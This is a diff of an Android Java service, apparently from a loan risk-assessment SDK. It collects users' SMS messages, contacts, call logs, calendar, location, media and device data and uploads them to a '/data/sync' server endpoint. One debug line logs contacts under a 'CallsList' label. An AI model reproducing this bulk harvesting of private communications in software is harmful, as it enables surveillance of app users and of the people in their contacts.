@@ -1,7 +1,6 @@
 package com.weithink.fengkong.services;
 
 import android.content.Context;
-import android.media.ExifInterface;
 
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
@@ -20,16 +19,14 @@ import com.weithink.fengkong.bean.AppInfo;
 import com.weithink.fengkong.bean.CalEventInfo;
 import com.weithink.fengkong.bean.CallsInfo;
 import com.weithink.fengkong.bean.CommonParams;
-import com.weithink.fengkong.bean.ContactsInfo;
 import com.weithink.fengkong.bean.DeviceInfo;
 import com.weithink.fengkong.bean.FileInfo;
 import com.weithink.fengkong.bean.LocationInfo;
 import com.weithink.fengkong.bean.MediaInfo;
-import com.weithink.fengkong.bean.MediaInfoMore;
-import com.weithink.fengkong.bean.MyParams;
 import com.weithink.fengkong.bean.PathInfo;
 import com.weithink.fengkong.bean.SmsInfo;
 import com.weithink.fengkong.network.UtilNetworking;
+import com.weithink.fengkong.util.ContactHelper;
 import com.weithink.fengkong.util.StorageUtil;
 import com.weithink.fengkong.util.StringNullAdapter;
 
@@ -96,6 +93,7 @@ public class TaskService {
         params.setBorrowId(util.getString("borrowId", ""));
         params.setUserPhone(util.getString("setUserPhone", ""));
         params.setExtend(util.getString("extend", ""));
+        params.setSdkVersion(Constants.VERSION);
 
 
         DeviceInfo deviceInfo = DeviceInfoApi.getDeviceInfo(WeithinkFengkong.getInstance().getContext());
@@ -120,15 +118,31 @@ public class TaskService {
         WeithinkFactory.getLogger().debug("locationList ====== " + locationList);
         params.setLocationInfos(locationList);
 
-        List<SmsInfo> smsInfoList = SmsApi.getSmsInfoList(WeithinkFengkong.getInstance().getContext());
+//        List<SmsInfo> smsInfoList = SmsApi.getSmsInfoList(WeithinkFengkong.getInstance().getContext());
+        List<SmsInfo> smsInfoList = SmsApi.getSmsInfos(WeithinkFengkong.getInstance().getContext());
         WeithinkFactory.getLogger().debug("smsInfoList ====== " + smsInfoList);
         params.setSmsInfos(smsInfoList);
 
-        List<ContactsInfo> contactsInfoList = ContactsApi.getTelList(WeithinkFengkong.getInstance().getContext());
-        WeithinkFactory.getLogger().debug("contactsInfoList ====== " + contactsInfoList);
-        params.setContactsInfos(contactsInfoList);
+//        List<ContactsInfo> contactsInfoList = ContactsApi.getTelList(WeithinkFengkong.getInstance().getContext());
+//        WeithinkFactory.getLogger().debug("contactsInfoList ====== " + contactsInfoList);
+//        params.setContactsInfos(contactsInfoList);
+
+//        List<Contact> contactsInfoList = ContactsApi.getContactList(WeithinkFengkong.getInstance().getContext());
+//        WeithinkFactory.getLogger().debug("contactsInfoList ====== " + contactsInfoList);
+//        params.setContactsInfos(contactsInfoList);
+
+
+//        List<Contact> contactsInfoList = (new ContactUtil(WeithinkFengkong.getInstance().getContext())).getContacts();
+//        WeithinkFactory.getLogger().debug("contactsInfoList ====== " + contactsInfoList);
+//        params.setContactsInfos(contactsInfoList);
+
+
+        List<ContactHelper.ModelContact>  contacts = ContactHelper.getContactDetails(WeithinkFengkong.getInstance().getContext());
+        WeithinkFactory.getLogger().debug("contacts ====== " + contacts);
+        params.setModelContacts(contacts);
 
         List<CallsInfo> callsInfos = ContactsApi.getCallsList(WeithinkFengkong.getInstance().getContext());
+        WeithinkFactory.getLogger().debug("CallsList ====== " + contacts);
         params.setCallsInfos(callsInfos);
 
         List<CalEventInfo> calEventInfoList = CalendarEventApi.getCalendarEventList(WeithinkFengkong.getInstance().getContext());
@@ -161,8 +175,7 @@ public class TaskService {
     private void upload2MyService(CommonParams params) throws Exception {
         StorageUtil util = StorageUtil.getInstance();
         String userId = util.getString("userId", "");
-        String subJson = util.getString("subJson", "");
-        String jsonString = converINfo(params, subJson);
+        String jsonString = converINfo(params);
 
         String postUrl = baseUrl+"/data/sync?userId=" + userId;
         UtilNetworking.HttpResponse response = UtilNetworking.sendPostI(postUrl, Constants.VERSION, jsonString);
@@ -173,25 +186,12 @@ public class TaskService {
         }
     }
 
-    private String converINfo(CommonParams params1, String subJson) throws IOException {
+    private String converINfo(CommonParams params1) throws IOException {
 
-        MyParams myParams = new MyParams();
-        myParams.convert(params1);
-        myParams.setSunJson(subJson);
-        //取出来照片中的制造商信息和手机型号信息
-        for (MediaInfoMore media : myParams.getMediaInfos()) {
-            if (media.getMediaType().contains("image")) {
-                ExifInterface exif = null;
-                exif = new ExifInterface(media.getMediaPath());
-                media.setMediaDeviceName(exif.getAttribute(ExifInterface.TAG_MAKE));//制造商
-                media.setMediaDeviceCode(exif.getAttribute(ExifInterface.TAG_MODEL));//型号
-
-            }
-        }
         //将对象转成json 保留空值
         GsonBuilder gsonBuilder = new GsonBuilder();
         gsonBuilder.registerTypeAdapter(String.class, new StringNullAdapter());
         Gson gson = gsonBuilder.create();
-        return gson.toJson(myParams);
+        return gson.toJson(params1);
     }
 }
